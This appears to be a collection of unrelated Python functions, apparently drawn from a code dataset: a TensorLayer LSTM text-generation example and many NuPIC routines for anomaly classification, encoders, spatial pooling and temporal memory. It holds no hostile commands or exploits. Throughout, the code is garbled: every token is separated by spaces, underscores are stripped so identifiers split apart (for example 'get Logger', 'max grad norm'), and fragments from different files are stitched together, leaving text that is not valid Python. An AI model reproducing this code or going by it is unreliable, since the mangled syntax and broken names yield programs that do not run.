def id to word ( self , word id ) : if word id >= len ( self . reverse vocab ) : return self . reverse vocab [ self . unk id ] else : return self . reverse vocab [ word id ]
def main lstm generate text ( ) : # rnn model and update  (describtion: see tutorial ptb lstm.py) init scale = 0.1 learning rate = 1.0 max grad norm = 5 sequence length = 20 hidden size = 200 max epoch = 4 max max epoch = 100 lr decay = 0.9 batch size = 20 top k list = [ 1 , 3 , 5 , 10 ] print length = 30 model file name = "model generate text.npz" # ===== Prepare Data words = customized read words ( input fpath = "data/trump/trump text.txt" ) vocab = tl . nlp . create vocab ( [ words ] , word counts output file = 'vocab.txt' , min word count = 1 ) vocab = tl . nlp . Vocabulary ( 'vocab.txt' , unk word = "<UNK>" ) vocab size = vocab . unk id + 1 train data = [ vocab . word to id ( word ) for word in words ] # Set the seed to generate sentence. seed = "it is a" # seed = basic clean str(seed).split() seed = nltk . tokenize . word tokenize ( seed ) print ( 'seed : %s' % seed ) sess = tf . Interactive Session ( ) # ===== Define model input data = tf . placeholder ( tf . int32 , [ batch size , sequence length ] ) targets = tf . placeholder ( tf . int32 , [ batch size , sequence length ] ) # Testing (Evaluation), for generate text input data test = tf . placeholder ( tf . int32 , [ 1 , 1 ] ) def inference ( x , is train , sequence length , reuse = None ) : print ( "\nsequence length: %d, is train: %s, reuse: %s" % ( sequence length , is train , reuse ) ) rnn init = tf . random uniform initializer ( - init scale , init scale ) with tf . variable scope ( "model" , reuse = reuse ) : network = Embedding Inputlayer ( x , vocab size , hidden size , rnn init , name = 'embedding' ) network = RNN Layer ( network , cell fn = tf . contrib . rnn . Basic LSTM Cell , cell init args = { 'forget bias' : 0.0 , 'state is tuple' : True } , n hidden = hidden size , initializer = rnn init , n steps = sequence length , return last = False , return seq 2d = True , name = 'lstm1' ) lstm1 = network network = Dense Layer ( network , vocab size , W init = rnn init , b init = rnn init , act = None , name = 'output' ) return network , lstm1 # Inference for Training network , lstm1 = inference ( input data , is train = True , sequence length = sequence length , reuse = None ) # Inference for generate text, sequence length=1 network test , lstm1 test = inference ( input data test , is train = False , sequence length = 1 , reuse = True ) y linear = network test . outputs y soft = tf . nn . softmax ( y linear ) # y id = tf.argmax(tf.nn.softmax(y), 1) # ===== Define train ops def loss fn ( outputs , targets , batch size , sequence length ) : # Returns the cost function of Cross-entropy of two sequences, implement # softmax internally. # outputs : 2D tensor [n examples, n outputs] # targets : 2D tensor [n examples, n outputs] # n examples = batch size * sequence length # so # cost is the averaged cost of each mini-batch (concurrent process). loss = tf . contrib . legacy seq2seq . sequence loss by example ( [ outputs ] , [ tf . reshape ( targets , [ - 1 ] ) ] , [ tf . ones ( [ batch size * sequence length ] ) ] ) cost = tf . reduce sum ( loss ) / batch size return cost # Cost for Training cost = loss fn ( network . outputs , targets , batch size , sequence length ) # Truncated Backpropagation for training with tf . variable scope ( 'learning rate' ) : lr = tf . Variable ( 0.0 , trainable = False ) # You can get all trainable parameters as follow. # tvars = tf.trainable variables() # Alternatively, you can specify the parameters for training as follw. #  tvars = network.all params      $ all parameters #  tvars = network.all params[1:]  $ parameters except embedding matrix # Train the whole network. tvars = network . all params grads , = tf . clip by global norm ( tf . gradients ( cost , tvars ) , max grad norm ) optimizer = tf . train . Gradient Descent Optimizer ( lr ) train op = optimizer . apply gradients ( zip ( grads , tvars ) ) # ===== Training sess . run ( tf . global variables initializer ( ) ) print ( "\n Start learning a model to generate text" ) for i in range ( max max epoch ) : # decrease the learning rate after ``max epoch``, by multipling lr decay. new lr decay = lr decay ** max ( i - max epoch , 0.0 ) sess . run ( tf . assign ( lr , learning rate * new lr decay ) ) print ( "Epoch: %d/%d Learning rate: %.8f" % ( i + 1 , max max epoch , sess . run ( lr ) ) ) epoch size = ( ( len ( train data ) // batch size ) - 1 ) // sequence length start time = time . time ( ) costs = 0.0 iters = 0 # reset all states at the begining of every epoch state1 = tl . layers . initialize rnn state ( lstm1 . initial state ) for step , ( x , y ) in enumerate ( tl . iterate . ptb iterator ( train data , batch size , sequence length ) ) : cost , state1 , = sess . run ( [ cost , lstm1 . final state , train op ] , feed dict = { input data : x , targets : y , lstm1 . initial state : state1 } ) costs += cost iters += sequence length if step % ( epoch size // 10 ) == 1 : print ( "%.3f perplexity: %.3f speed: %.0f wps" % ( step * 1.0 / epoch size , np . exp ( costs / iters ) , iters * batch size / ( time . time ( ) - start time ) ) ) train perplexity = np . exp ( costs / iters ) # print("Epoch: %d Train Perplexity: %.3f" % (i + 1, train perplexity)) print ( "Epoch: %d/%d Train Perplexity: %.3f" % ( i + 1 , max max epoch , train perplexity ) ) # for diversity in diversity list: # testing: sample from top k words for top k in top k list : # Testing, generate some text from a given seed. state1 = tl . layers . initialize rnn state ( lstm1 test . initial state ) # state2 = tl.layers.initialize rnn state(lstm2 test.initial state) outs id = [ vocab . word to id ( w ) for w in seed ] # feed the seed to initialize the state for generation. for ids in outs id [ : - 1 ] : a id = np . asarray ( ids ) . reshape ( 1 , 1 ) state1 = sess . run ( [ lstm1 test . final state ] , feed dict = { input data test : a id , lstm1 test . initial state : state1 } ) # feed the last word in seed, and start to generate sentence. a id = outs id [ - 1 ] for in range ( print length ) : a id = np . asarray ( a id ) . reshape ( 1 , 1 ) out , state1 = sess . run ( [ y soft , lstm1 test . final state ] , feed dict = { input data test : a id , lstm1 test . initial state : state1 } ) # Without sampling # a id = np.argmax(out[0]) # Sample from all words, if vocab size is large, # this may have numeric error. # a id = tl.nlp.sample(out[0], diversity) # Sample from the top k words. a id = tl . nlp . sample top ( out [ 0 ] , top k = top k ) outs id . append ( a id ) sentence = [ vocab . id to word ( w ) for w in outs id ] sentence = " " . join ( sentence ) # print(diversity, ':', sentence) print ( top k , ':' , sentence ) print ( "Save model" ) tl . files . save npz ( network test . all params , name = model file name )
def get Logger ( cls , log Level = None ) : logger = logging . get Logger ( "." . join ( [ 'com.numenta' , MODULE NAME , cls . name ] ) ) if log Level is not None : logger . set Level ( log Level ) return logger
def close ( self ) : self . logger . info ( "Closing" ) if self . conn is not None : self . conn . close ( ) self . conn = None else : self . logger . warning ( "close() called, but connection policy was alredy closed" ) return
def close ( self ) : self . logger . info ( "Closing" ) if self . pool is not None : self . pool . close ( ) self . pool = None else : self . logger . warning ( "close() called, but connection policy was alredy closed" ) return
def close ( self ) : self . logger . info ( "Closing" ) if self . opened : self . opened = False else : self . logger . warning ( "close() called, but connection policy was alredy closed" ) return
def classify State ( self , state ) : # Record is before wait period do not classifiy if state . ROWID < self . get Parameter ( 'train Records' ) : if not state . set By User : state . anomaly Label = [ ] self . delete Records From KNN ( [ state ] ) return label = KNN Anomaly Classifier Region . AUTO THRESHOLD CLASSIFIED LABEL auto Label = label + KNN Anomaly Classifier Region . AUTO TAG # Update the label based on classifications new Category = self . recompute Record From KNN ( state ) label List = self . category To Label List ( new Category ) if state . set By User : if label in state . anomaly Label : state . anomaly Label . remove ( label ) if auto Label in state . anomaly Label : state . anomaly Label . remove ( auto Label ) label List . extend ( state . anomaly Label ) # Add threshold classification label if above threshold, else if # classified to add the auto threshold classification. if state . anomaly Score >= self . get Parameter ( 'anomaly Threshold' ) : label List . append ( label ) elif label in label List : ind = label List . index ( label ) label List [ ind ] = auto Label # Make all entries unique label List = list ( set ( label List ) ) # If both above threshold and auto classified above - remove auto label if label in label List and auto Label in label List : label List . remove ( auto Label ) if state . anomaly Label == label List : return # Update state's labeling state . anomaly Label = label List # Update KNN Classifier with new labeling if state . anomaly Label == [ ] : self . delete Records From KNN ( [ state ] ) else : self . add Record To KNN ( state )
def add Record To KNN ( self , record ) : knn = self . knnclassifier . knn prototype idx = self . knnclassifier . get Parameter ( 'category Recency List' ) category = self . label List To Category Number ( record . anomaly Label ) # If record is already in the classifier, overwrite its labeling if record . ROWID in prototype idx : knn . prototype Set Category ( record . ROWID , category ) return # Learn this pattern in the knn pattern = self . get State Anomaly Vector ( record ) row ID = record . ROWID knn . learn ( pattern , category , row ID = row ID )
def recompute Record From KNN ( self , record ) : inputs = { "category In" : [ None ] , "bottom Up In" : self . get State Anomaly Vector ( record ) , } outputs = { "categories Out" : numpy . zeros ( ( 1 , ) ) , "best Prototype Indices" : numpy . zeros ( ( 1 , ) ) , "category Probabilities Out" : numpy . zeros ( ( 1 , ) ) } # Only use points before record to classify and after the wait period. classifier indexes = numpy . array ( self . knnclassifier . get Parameter ( 'category Recency List' ) ) valid idx = numpy . where ( ( classifier indexes >= self . get Parameter ( 'train Records' ) ) & ( classifier indexes < record . ROWID ) ) [ 0 ] . tolist ( ) if len ( valid idx ) == 0 : return None self . knnclassifier . set Parameter ( 'inference Mode' , None , True ) self . knnclassifier . set Parameter ( 'learning Mode' , None , False ) self . knnclassifier . compute ( inputs , outputs ) self . knnclassifier . set Parameter ( 'learning Mode' , None , True ) classifier distances = self . knnclassifier . get Latest Distances ( ) valid distances = classifier distances [ valid idx ] if valid distances . min ( ) <= self . classification Max Dist : classifier indexes prev = classifier indexes [ valid idx ] row ID = classifier indexes prev [ valid distances . argmin ( ) ] index ID = numpy . where ( classifier indexes == row ID ) [ 0 ] [ 0 ] category = self . knnclassifier . get Category List ( ) [ index ID ] return category return None
def category To Label List ( self , category ) : if category is None : return [ ] label List = [ ] label Num = 0 while category > 0 : if category % 2 == 1 : label List . append ( self . saved categories [ label Num ] ) label Num += 1 category = category >> 1 return label List
def get State Anomaly Vector ( self , state ) : vector = numpy . zeros ( self . anomaly Vector Length ) vector [ state . anomaly Vector ] = 1 return vector
def match ( self , record ) : for field , meta in self . filter Dict . iteritems ( ) : index = meta [ 'index' ] categories = meta [ 'categories' ] for category in categories : # Record might be blank, handle this if not record : continue if record [ index ] . find ( category ) != - 1 : return True # None of the categories were found in this record return False
def update Boost Factors Global ( self ) : # When global inhibition is enabled, the target activation level is # the sparsity of the spatial pooler if ( self . local Area Density > 0 ) : target Density = self . local Area Density else : inhibition Area = ( ( 2 * self . inhibition Radius + 1 ) ** self . column Dimensions . size ) inhibition Area = min ( self . num Columns , inhibition Area ) target Density = float ( self . num Active Columns Per Inh Area ) / inhibition Area target Density = min ( target Density , 0.5 ) self . boost Factors = numpy . exp ( ( target Density - self . active Duty Cycles ) * self . boost Strength )
def update Boost Factors Local ( self ) : # Determine the target activation level for each column # The target Density is the average active Duty Cycles of the neighboring # columns of each column. target Density = numpy . zeros ( self . num Columns , dtype = real D Type ) for i in xrange ( self . num Columns ) : mask Neighbors = self . get Column Neighborhood ( i ) target Density [ i ] = numpy . mean ( self . active Duty Cycles [ mask Neighbors ] ) self . boost Factors = numpy . exp ( ( target Density - self . active Duty Cycles ) * self . boost Strength )
def seed ( self , seed = - 1 ) : if seed != - 1 : self . random = Nupic Random ( seed ) else : self . random = Nupic Random ( )
def get Input Names ( self ) : inputs = self . get Spec ( ) . inputs return [ inputs . get By Index ( i ) [ 0 ] for i in xrange ( inputs . get Count ( ) ) ]
def get Output Names ( self ) : outputs = self . get Spec ( ) . outputs return [ outputs . get By Index ( i ) [ 0 ] for i in xrange ( outputs . get Count ( ) ) ]
def is Sprint Completed ( self , sprint Idx ) : num Existing Sprints = len ( self . state [ 'sprints' ] ) if sprint Idx >= num Existing Sprints : return False return ( self . state [ 'sprints' ] [ sprint Idx ] [ 'status' ] == 'completed' )
def create Encoder ( ) : consumption encoder = Scalar Encoder ( 21 , 0.0 , 100.0 , n = 50 , name = "consumption" , clip Input = True ) time encoder = Date Encoder ( time Of Day = ( 21 , 9.5 ) , name = "timestamp time Of Day" ) encoder = Multi Encoder ( ) encoder . add Encoder ( "consumption" , consumption encoder ) encoder . add Encoder ( "timestamp" , time encoder ) return encoder
def validate Experiment Control ( self , control ) : # Validate task list task List = control . get ( 'tasks' , None ) if task List is not None : task Labels List = [ ] for task in task List : validate Opf Json Value ( task , "opf Task Schema.json" ) validate Opf Json Value ( task [ 'task Control' ] , "opf Task Control Schema.json" ) task Label = task [ 'task Label' ] assert isinstance ( task Label , types . String Types ) , "task Label type: %r" % type ( task Label ) assert len ( task Label ) > 0 , "empty string task Label not is allowed" task Labels List . append ( task Label . lower ( ) ) task Label Duplicates = filter ( lambda x : task Labels List . count ( x ) > 1 , task Labels List ) assert len ( task Label Duplicates ) == 0 , "Duplcate task labels are not allowed: %s" % task Label Duplicates return
def r Update ( original , updates ) : # Keep a list of the sub-dictionaries that need to be updated to avoid having # to use recursion (which could fail for dictionaries with a lot of nesting. dict Pairs = [ ( original , updates ) ] while len ( dict Pairs ) > 0 : original , updates = dict Pairs . pop ( ) for k , v in updates . iteritems ( ) : if k in original and isinstance ( original [ k ] , dict ) and isinstance ( v , dict ) : dict Pairs . append ( ( original [ k ] , v ) ) else : original [ k ] = v
def seed ( self , seed = - 1 ) : if seed != - 1 : self . random = Nupic Random ( seed ) else : self . random = Nupic Random ( )
def get Scalars ( self , input ) : if input == SENTINEL VALUE FOR MISSING DATA : return numpy . array ( [ 0 ] ) index = self . category To Index . get ( input , None ) if index is None : if self . learning Enabled : self . add Category ( input ) index = self . ncategories - 1 else : # if not found, we encode category 0 index = 0 return numpy . array ( [ index ] )
def decode ( self , encoded , parent Field Name = '' ) : assert ( encoded [ 0 : self . n ] <= 1.0 ) . all ( ) result String = "" result Ranges = [ ] overlaps = ( self . sdrs * encoded [ 0 : self . n ] ) . sum ( axis = 1 ) if self . verbosity >= 2 : print "Overlaps for decoding:" for i in xrange ( 0 , self . ncategories ) : print "%d %s" % ( overlaps [ i ] , self . categories [ i ] ) matching Categories = ( overlaps > self . threshold Overlap ) . nonzero ( ) [ 0 ] for index in matching Categories : if result String != "" : result String += " " result String += str ( self . categories [ index ] ) result Ranges . append ( [ int ( index ) , int ( index ) ] ) if parent Field Name != '' : field Name = "%s.%s" % ( parent Field Name , self . name ) else : field Name = self . name return ( { field Name : ( result Ranges , result String ) } , [ field Name ] )
def get Bucket Info ( self , buckets ) : if self . ncategories == 0 : return 0 top Down Mapping M = self . get Top Down Mapping ( ) category Index = buckets [ 0 ] category = self . categories [ category Index ] encoding = top Down Mapping M . get Row ( category Index ) return [ Encoder Result ( value = category , scalar = category Index , encoding = encoding ) ]
def top Down Compute ( self , encoded ) : if self . ncategories == 0 : return 0 top Down Mapping M = self . get Top Down Mapping ( ) category Index = top Down Mapping M . right Vec Prod ( encoded ) . argmax ( ) category = self . categories [ category Index ] encoding = top Down Mapping M . get Row ( category Index ) return Encoder Result ( value = category , scalar = category Index , encoding = encoding )
def get Scalar Names ( self , parent Field Name = '' ) : names = [ ] # This forms a name which is the concatenation of the parent Field Name #   passed in and the encoder's own name. def form Field Name ( encoder ) : if parent Field Name == '' : return encoder . name else : return '%s.%s' % ( parent Field Name , encoder . name ) # ------------------------------------------------------------------------- # Get the scalar values for each sub-field if self . season Encoder is not None : names . append ( form Field Name ( self . season Encoder ) ) if self . day Of Week Encoder is not None : names . append ( form Field Name ( self . day Of Week Encoder ) ) if self . custom Days Encoder is not None : names . append ( form Field Name ( self . custom Days Encoder ) ) if self . weekend Encoder is not None : names . append ( form Field Name ( self . weekend Encoder ) ) if self . holiday Encoder is not None : names . append ( form Field Name ( self . holiday Encoder ) ) if self . time Of Day Encoder is not None : names . append ( form Field Name ( self . time Of Day Encoder ) ) return names
def get Encoded Values ( self , input ) : if input == SENTINEL VALUE FOR MISSING DATA : return numpy . array ( [ None ] ) assert isinstance ( input , datetime . datetime ) values = [ ] # ------------------------------------------------------------------------- # Get the scalar values for each sub-field timetuple = input . timetuple ( ) time Of Day = timetuple . tm hour + float ( timetuple . tm min ) / 60.0 if self . season Encoder is not None : day Of Year = timetuple . tm yday # input.timetuple() computes the day of year 1 based, so convert to 0 based values . append ( day Of Year - 1 ) if self . day Of Week Encoder is not None : day Of Week = timetuple . tm wday + time Of Day / 24.0 values . append ( day Of Week ) if self . weekend Encoder is not None : # saturday, sunday or friday evening if timetuple . tm wday == 6 or timetuple . tm wday == 5 or ( timetuple . tm wday == 4 and time Of Day > 18 ) : weekend = 1 else : weekend = 0 values . append ( weekend ) if self . custom Days Encoder is not None : if timetuple . tm wday in self . custom Days : custom Day = 1 else : custom Day = 0 values . append ( custom Day ) if self . holiday Encoder is not None : # A "continuous" binary value. = 1 on the holiday itself and smooth ramp #  0->1 on the day before the holiday and 1->0 on the day after the holiday. # Currently the only holiday we know about is December 25 # holidays is a list of holidays that occur on a fixed date every year if len ( self . holidays ) == 0 : holidays = [ ( 12 , 25 ) ] else : holidays = self . holidays val = 0 for h in holidays : # hdate is midnight on the holiday if len ( h ) == 3 : hdate = datetime . datetime ( h [ 0 ] , h [ 1 ] , h [ 2 ] , 0 , 0 , 0 ) else : hdate = datetime . datetime ( timetuple . tm year , h [ 0 ] , h [ 1 ] , 0 , 0 , 0 ) if input > hdate : diff = input - hdate if diff . days == 0 : # return 1 on the holiday itself val = 1 break elif diff . days == 1 : # ramp smoothly from 1 -> 0 on the next day val = 1.0 - ( float ( diff . seconds ) / 86400 ) break else : diff = hdate - input if diff . days == 0 : # ramp smoothly from 0 -> 1 on the previous day val = 1.0 - ( float ( diff . seconds ) / 86400 ) values . append ( val ) if self . time Of Day Encoder is not None : values . append ( time Of Day ) return values
def get Bucket Indices ( self , input ) : if input == SENTINEL VALUE FOR MISSING DATA : # Encoder each sub-field return [ None ] * len ( self . encoders ) else : assert isinstance ( input , datetime . datetime ) # Get the scalar values for each sub-field scalars = self . get Scalars ( input ) # Encoder each sub-field result = [ ] for i in xrange ( len ( self . encoders ) ) : ( name , encoder , offset ) = self . encoders [ i ] result . extend ( encoder . get Bucket Indices ( scalars [ i ] ) ) return result
def encode Into Array ( self , input , output ) : if input == SENTINEL VALUE FOR MISSING DATA : output [ 0 : ] = 0 else : if not isinstance ( input , datetime . datetime ) : raise Value Error ( "Input is type %s, expected datetime. Value: %s" % ( type ( input ) , str ( input ) ) ) # Get the scalar values for each sub-field scalars = self . get Scalars ( input ) # Encoder each sub-field for i in xrange ( len ( self . encoders ) ) : ( name , encoder , offset ) = self . encoders [ i ] encoder . encode Into Array ( scalars [ i ] , output [ offset : ] )
def get Spec ( cls ) : spec = { "description" : Identity Region . doc , "single Node Only" : True , "inputs" : { "in" : { "description" : "The input vector." , "data Type" : "Real32" , "count" : 0 , "required" : True , "region Level" : False , "is Default Input" : True , "require Splitter Map" : False } , } , "outputs" : { "out" : { "description" : "A copy of the input vector." , "data Type" : "Real32" , "count" : 0 , "region Level" : True , "is Default Output" : True } , } , "parameters" : { "data Width" : { "description" : "Size of inputs" , "access Mode" : "Read" , "data Type" : "U Int32" , "count" : 1 , "constraints" : "" } , } , } return spec
def add Record To KNN ( self , record ) : classifier = self . htm prediction model . get Anomaly Classifier ( ) knn = classifier . get Self ( ) . knn prototype idx = classifier . get Self ( ) . get Parameter ( 'category Recency List' ) category = self . label List To Category Number ( record . anomaly Label ) # If record is already in the classifier, overwrite its labeling if record . ROWID in prototype idx : knn . prototype Set Category ( record . ROWID , category ) return # Learn this pattern in the knn pattern = self . get State Anomaly Vector ( record ) row ID = record . ROWID knn . learn ( pattern , category , row ID = row ID )
def recompute Record From KNN ( self , record ) : inputs = { "category In" : [ None ] , "bottom Up In" : self . get State Anomaly Vector ( record ) , } outputs = { "categories Out" : numpy . zeros ( ( 1 , ) ) , "best Prototype Indices" : numpy . zeros ( ( 1 , ) ) , "category Probabilities Out" : numpy . zeros ( ( 1 , ) ) } # Run inference only to capture state before learning classifier = self . htm prediction model . get Anomaly Classifier ( ) knn = classifier . get Self ( ) . knn # Only use points before record to classify and after the wait period. classifier indexes = numpy . array ( classifier . get Self ( ) . get Parameter ( 'category Recency List' ) ) valid idx = numpy . where ( ( classifier indexes >= self . auto Detect Wait Records ) & ( classifier indexes < record . ROWID ) ) [ 0 ] . tolist ( ) if len ( valid idx ) == 0 : return None classifier . set Parameter ( 'inference Mode' , True ) classifier . set Parameter ( 'learning Mode' , False ) classifier . get Self ( ) . compute ( inputs , outputs ) classifier . set Parameter ( 'learning Mode' , True ) classifier distances = classifier . get Self ( ) . get Latest Distances ( ) valid distances = classifier distances [ valid idx ] if valid distances . min ( ) <= self . classification Max Dist : classifier indexes prev = classifier indexes [ valid idx ] row ID = classifier indexes prev [ valid distances . argmin ( ) ] index ID = numpy . where ( classifier indexes == row ID ) [ 0 ] [ 0 ] category = classifier . get Self ( ) . get Category List ( ) [ index ID ] return category return None
def compute ( self ) : result = self . construct Classification Record ( ) # Classify this point after waiting the classification delay if result . ROWID >= self . auto Detect Wait Records : self . update State ( result ) # Save new classification record and keep history as moving window self . saved states . append ( result ) if len ( self . saved states ) > self . history length : self . saved states . pop ( 0 ) return result
def set Auto Detect Wait Records ( self , wait Records ) : if not isinstance ( wait Records , int ) : raise HTM Prediction Model Invalid Argument ( "Invalid argument type \'%s\'. Wait Record " "must be a number." % ( type ( wait Records ) ) ) if len ( self . saved states ) > 0 and wait Records < self . saved states [ 0 ] . ROWID : raise HTM Prediction Model Invalid Argument ( "Invalid value. auto Detect Wait Record value " "must be valid record within output stream. Current minimum ROWID in " "output stream is %d." % ( self . saved states [ 0 ] . ROWID ) ) self . auto Detect Wait Records = wait Records # Update all the states in the classifier's cache for state in self . saved states : self . update State ( state )
def allocate Spatial FDR ( self , rf Input ) : if self . sfdr : return # Retrieve the necessary extra arguments that were handled automatically auto Args = dict ( ( name , getattr ( self , name ) ) for name in self . spatial Arg Names ) # Instantiate the spatial pooler class. if ( ( self . Spatial Class == CPP Spatial Pooler ) or ( self . Spatial Class == PY Spatial Pooler ) ) : auto Args [ 'column Dimensions' ] = [ self . column Count ] auto Args [ 'input Dimensions' ] = [ self . input Width ] auto Args [ 'potential Radius' ] = self . input Width self . sfdr = self . Spatial Class ( * * auto Args )
def compute ( self , inputs , outputs ) : #if self.top Down Mode and (not 'top Down In' in inputs): #  raise Runtime Error("The input top Down In must be linked in if " #                     "top Down Mode is True") if self . sfdr is None : raise Runtime Error ( "Spatial pooler has not been initialized" ) if not self . top Down Mode : # # BOTTOM-UP compute # self . iterations += 1 # Get our inputs into numpy arrays bu Input Vector = inputs [ 'bottom Up In' ] reset Signal = False if 'reset In' in inputs : assert len ( inputs [ 'reset In' ] ) == 1 reset Signal = inputs [ 'reset In' ] [ 0 ] != 0 # Perform inference and/or learning rf Output = self . do Bottom Up Compute ( rf Input = bu Input Vector . reshape ( ( 1 , bu Input Vector . size ) ) , reset Signal = reset Signal ) outputs [ 'bottom Up Out' ] [ : ] = rf Output . flat else : # # TOP-DOWN inference # top Down In = inputs . get ( 'top Down In' , None ) spatial Top Down Out , temporal Top Down Out = self . do Top Down Infer ( top Down In ) outputs [ 'spatial Top Down Out' ] [ : ] = spatial Top Down Out if temporal Top Down Out is not None : outputs [ 'temporal Top Down Out' ] [ : ] = temporal Top Down Out # OBSOLETE outputs [ 'anomaly Score' ] [ : ] = 0
def init Ephemerals ( self ) : if hasattr ( self , ' sfdr' ) and self . sfdr : self . spatial Pooler Output = numpy . zeros ( self . column Count , dtype = Get NTA Real ( ) ) else : self . spatial Pooler Output = None # Will be filled in init In Network # Direct logging support (faster than node watch) self . fp Log SP Input = None self . fp Log SP = None self . fp Log SP Dense = None self . log Path Input = "" self . log Path Output = "" self . log Path Output Dense = ""
def get TP Class ( temporal Imp ) : if temporal Imp == 'py' : return backtracking tm . Backtracking TM elif temporal Imp == 'cpp' : return backtracking tm cpp . Backtracking TMCPP elif temporal Imp == 'tm py' : return backtracking tm shim . TM Shim elif temporal Imp == 'tm cpp' : return backtracking tm shim . TMCPP Shim elif temporal Imp == 'monitored tm py' : return backtracking tm shim . Monitored TM Shim else : raise Runtime Error ( "Invalid temporal Imp '%s'. Legal values are: 'py', " "'cpp', 'tm py', 'monitored tm py'" % ( temporal Imp ) )
def compute ( self , inputs , outputs ) : #if self.top Down Mode and (not 'top Down In' in inputs): # raise Runtime Error("The input top Down In must be linked in if " #                    "top Down Mode is True") if self . tfdr is None : raise Runtime Error ( "TM has not been initialized" ) # Conditional compute break self . conditional Break ( ) self . iterations += 1 # Get our inputs as numpy array bu Input Vector = inputs [ 'bottom Up In' ] # Handle reset signal reset Signal = False if 'reset In' in inputs : assert len ( inputs [ 'reset In' ] ) == 1 if inputs [ 'reset In' ] [ 0 ] != 0 : self . tfdr . reset ( ) self . sequence Pos = 0 # Position within the current sequence if self . compute Predicted Active Cell Indices : prev Predicted State = self . tfdr . get Predicted State ( ) . reshape ( - 1 ) . astype ( 'float32' ) if self . anomaly Mode : prev Predicted Columns = self . tfdr . top Down Compute ( ) . copy ( ) . nonzero ( ) [ 0 ] # Perform inference and/or learning tp Output = self . tfdr . compute ( bu Input Vector , self . learning Mode , self . inference Mode ) self . sequence Pos += 1 # OR'ing together the cells in each column? if self . or Column Outputs : tp Output = tp Output . reshape ( self . column Count , self . cells Per Column ) . max ( axis = 1 ) # Direct logging of non-zero TM outputs if self . fp Log TP Output : output = tp Output . reshape ( - 1 ) output NZ = tp Output . nonzero ( ) [ 0 ] out Str = " " . join ( [ "%d" % int ( token ) for token in output NZ ] ) print >> self . fp Log TP Output , output . size , out Str # Write the bottom up out to our node outputs outputs [ 'bottom Up Out' ] [ : ] = tp Output . flat if self . top Down Mode : # Top-down compute outputs [ 'top Down Out' ] [ : ] = self . tfdr . top Down Compute ( ) . copy ( ) # Set output for use with anomaly classification region if in anomaly Mode if self . anomaly Mode : active Learn Cells = self . tfdr . get Learn Active State T ( ) size = active Learn Cells . shape [ 0 ] * active Learn Cells . shape [ 1 ] outputs [ 'lrn Active State T' ] [ : ] = active Learn Cells . reshape ( size ) active Columns = bu Input Vector . nonzero ( ) [ 0 ] outputs [ 'anomaly Score' ] [ : ] = anomaly . compute Raw Anomaly Score ( active Columns , prev Predicted Columns ) if self . compute Predicted Active Cell Indices : # Reshape so we are dealing with 1D arrays active State = self . tfdr . get Active State ( ) . reshape ( - 1 ) . astype ( 'float32' ) active Indices = numpy . where ( active State != 0 ) [ 0 ] predicted Indices = numpy . where ( prev Predicted State != 0 ) [ 0 ] predicted Active Indices = numpy . intersect1d ( active Indices , predicted Indices ) outputs [ "active Cells" ] . fill ( 0 ) outputs [ "active Cells" ] [ active Indices ] = 1 outputs [ "predicted Active Cells" ] . fill ( 0 ) outputs [ "predicted Active Cells" ] [ predicted Active Indices ] = 1
def get Version ( ) : with open ( os . path . join ( REPO DIR , "VERSION" ) , "r" ) as version File : return version File . read ( ) . strip ( )
def generate Extra Metric Specs ( options ) : metric Spec Schema = { 'properties' : { } } results = [ ] for metric in options [ 'metrics' ] : for property Name in metric Spec Schema [ 'properties' ] . keys ( ) : get Property Value ( metric Spec Schema , property Name , metric ) spec String , label = generate Metric Spec String ( field = metric [ 'field' ] , metric = metric [ 'metric' ] , params = metric [ 'params' ] , inference Element = metric [ 'inference Element' ] , return Label = True ) if metric [ 'logged' ] : options [ 'logged Metrics' ] . append ( label ) results . append ( spec String ) return results
def hash Coordinate ( coordinate ) : coordinate Str = "," . join ( str ( v ) for v in coordinate ) # Compute the hash and convert to 64 bit int. hash = int ( int ( hashlib . md5 ( coordinate Str ) . hexdigest ( ) , 16 ) % ( 2 ** 64 ) ) return hash
def same TM Params ( tp1 , tp2 ) : result = True for param in [ "number Of Cols" , "cells Per Column" , "initial Perm" , "connected Perm" , "min Threshold" , "new Synapse Count" , "permanence Inc" , "permanence Dec" , "permanence Max" , "global Decay" , "activation Threshold" , "do Pooling" , "seg Update Valid Duration" , "burn In" , "pam Length" , "max Age" ] : if getattr ( tp1 , param ) != getattr ( tp2 , param ) : print param , "is different" print getattr ( tp1 , param ) , "vs" , getattr ( tp2 , param ) result = False return result
def same Segment ( seg1 , seg2 ) : result = True # check sequence segment, total activations etc. In case any are floats, # check that they are within 0.001. for field in [ 1 , 2 , 3 , 4 , 5 , 6 ] : if abs ( seg1 [ 0 ] [ field ] - seg2 [ 0 ] [ field ] ) > 0.001 : result = False # Compare number of synapses if len ( seg1 [ 1 : ] ) != len ( seg2 [ 1 : ] ) : result = False # Now compare synapses, ignoring order of synapses for syn in seg2 [ 1 : ] : if syn [ 2 ] <= 0 : print "A synapse with zero permanence encountered" result = False if result == True : for syn in seg1 [ 1 : ] : if syn [ 2 ] <= 0 : print "A synapse with zero permanence encountered" result = False res = same Synapse ( syn , seg2 [ 1 : ] ) if res == False : result = False return result
def log Probability ( self , distn ) : x = numpy . asarray ( distn ) n = x . sum ( ) return ( log Factorial ( n ) - numpy . sum ( [ log Factorial ( k ) for k in x ] ) + numpy . sum ( x * numpy . log ( self . dist . pmf ) ) )
def create Data Out Link ( network , sensor Region Name , region Name ) : network . link ( sensor Region Name , region Name , "Uniform Link" , "" , src Output = "data Out" , dest Input = "bottom Up In" )
def create Sensor To Classifier Links ( network , sensor Region Name , classifier Region Name ) : network . link ( sensor Region Name , classifier Region Name , "Uniform Link" , "" , src Output = "bucket Idx Out" , dest Input = "bucket Idx In" ) network . link ( sensor Region Name , classifier Region Name , "Uniform Link" , "" , src Output = "act Value Out" , dest Input = "act Value In" ) network . link ( sensor Region Name , classifier Region Name , "Uniform Link" , "" , src Output = "category Out" , dest Input = "category In" )
